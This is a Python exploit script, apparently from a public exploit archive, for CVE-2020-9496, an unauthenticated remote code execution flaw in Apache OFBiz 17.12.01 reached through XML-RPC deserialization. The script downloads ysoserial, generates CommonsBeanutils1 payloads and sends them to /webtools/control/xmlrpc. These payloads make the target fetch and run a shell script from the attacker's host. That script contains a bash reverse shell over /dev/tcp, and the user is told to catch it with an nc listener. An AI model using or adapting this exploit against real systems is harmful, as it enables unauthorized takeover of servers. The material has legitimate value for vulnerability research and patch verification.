#!/usr/bin/python3

# Exploit Title: ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments
# Date: 2022-08-16
# Exploit Author: Javier García (Ly0nt4R)
# Vendor Homepage: https://ofbiz.apache.org/index.html
# Software Link: https://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip
# Version: 17.12.01
# Tested on: Linux

# CVE : CVE-2020-9496
# Reference: https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz/
# Description: unauthorized RCE. Automate exploit python3.   This CVE was discovered by Alvaro Muñoz

# Because the 2 xmlrpc related requets in webtools (xmlrpc and ping) are not using authentication they are vulnerable to unsafe deserialization. 
# This issue was reported to the security team by Alvaro Munoz pwntester@github.com from the GitHub Security Lab team.
# This vulnerability exists due to Java serialization issues when processing requests sent to /webtools/control/xmlrpc.
# A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request. Successful exploitation would result in arbitrary code execution.


# Steps to exploit:

# Step 1: Start nc listener (nc -lnvp <port>).
# Step 2: Run the exploit.



import os
from pwn import *
import time
import argparse
from tqdm import tqdm
import urllib.request
import os.path
from progress.bar import Bar
import requests
from http.server import HTTPServer, CGIHTTPRequestHandler
import subprocess
import threading

#Global Variables

downloadSource="https://github.com/frohoff/ysoserial"
downloadJar="https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar"

# Arguments
parser = argparse.ArgumentParser()
requiredNamed = parser.add_argument_group('Required named arguments')
requiredNamed.add_argument("-i","--ip", help="Option to put the remote ip", required=True)
requiredNamed.add_argument("-p","--port", help="Option to put the remote port", required=True)
requiredNamed.add_argument("-li", help="Option to put the local ip", required=True)
requiredNamed.add_argument("-lp", help="Option to put the local port", required=True)
parser.parse_args()
args=parser.parse_args()

def banner():

	print ('''
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██████╗      █████╗ ██╗  ██╗ █████╗  ██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔═████╗    ██╔══██╗██║  ██║██╔══██╗██╔════╝ 
██║     ██║   ██║█████╗       █████╔╝██║██╔██║ █████╔╝██║██╔██║    ╚██████║███████║╚██████║███████╗ 
██║     ╚██╗ ██╔╝██╔══╝      ██╔═══╝ ████╔╝██║██╔═══╝ ████╔╝██║     ╚═══██║╚════██║ ╚═══██║██╔═══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗╚██████╔╝     █████╔╝     ██║ █████╔╝╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝      ╚════╝      ╚═╝ ╚════╝  ╚═════╝ 
 Author @Ly0nt4R
-----------------------------------------------------------------------------------------------------                                                                                                    
''')


def createShell():
	bash="/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (args.li,args.lp)
	script = open('shell.sh', 'w')
	script.write(bash)
	script.close()
	
def createServerPython():
	p3=log.progress("Running server in python")
	os.chdir('.')
	server_object = HTTPServer(server_address=('', 80), RequestHandlerClass=CGIHTTPRequestHandler) # Create server object listening the port 80
	server_object.serve_forever()
	sleep(10)
	server_object.close_connection

def downloadFiles():
	p2=log.progress("Downloading JAR file")
	urllib.request.urlretrieve(downloadJar,"ysoserial-master-d367e379d9-1.jar")
	p2.status("Download finish")

def sendMaliciusCode():
	p3=log.progress("")
	p3.status("Generating a JAR payload")
	payload='java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget %s/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\\n"' % (args.li)
	script = open('java.sh', 'w')
	script.write(payload)
	script.close()
	process= subprocess.check_output(['bash java.sh'], shell=True)
	process=str(process,'utf-8')
	p3.status("Sending a payload")
	extensionCode='curl -s https://%s:%s/webtools/control/xmlrpc -X POST -v -d \'<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">%s</serializable></value></member></struct></value></param></params></methodCall>\' -k  -H "Content-Type:application/xml" &>/dev/null' % (args.ip,args.port,process)
	code= open('code.sh','w')
	code.write(extensionCode)
	code.close()

	process2=subprocess.run(['bash code.sh'], shell=True)
	
	p3.status("The payload has been load")

def executeMaliciusCode():
	p4=log.progress("")
	p4.status("Generating a JAR execute")
	payload='java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\\n"'
	script = open('java2.sh','w')
	script.write(payload)
	script.close()
	process= subprocess.check_output(['bash java2.sh'], shell=True)
	process=str(process,'utf-8')
	p4.status("Executing a payload")
	executeCode='curl -s https://%s:%s/webtools/control/xmlrpc -X POST -v -d \'<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">%s</serializable></value></member></struct></value></param></params></methodCall>\' -k  -H "Content-Type:application/xml" &>/dev/null' % (args.ip,args.port,process)
	code=open('code2.sh','w')
	code.write(executeCode)
	code.close()
	process2=subprocess.run(['bash code2.sh'], shell=True)

	p4.status("The payload has been execute :)")
	print ("\ncheck your nc | ip: %s port: %s  " % (args.li,args.lp))

	deleteFiles()

def deleteFiles():
	os.remove("java.sh")
	os.remove("java2.sh")
	os.remove("code.sh")
	os.remove("code2.sh")
	os.remove("shell.sh")
	os.remove("ysoserial-master-d367e379d9-1.jar")

	print ("Temporal files deleted")	

if __name__=="__main__": 
	banner() 
	print ("open nc: nc -nlvp %s \n" % (args.lp)) 
	sleep(2) 
	p1=log.progress("Create bash file ") 
	createShell()
	downloadFiles() 
	p1.status("Created") 
	h1= threading.Thread(target=createServerPython) 
	h1.start() 
	sleep(3) 
	sendMaliciusCode() 
	executeMaliciusCode()

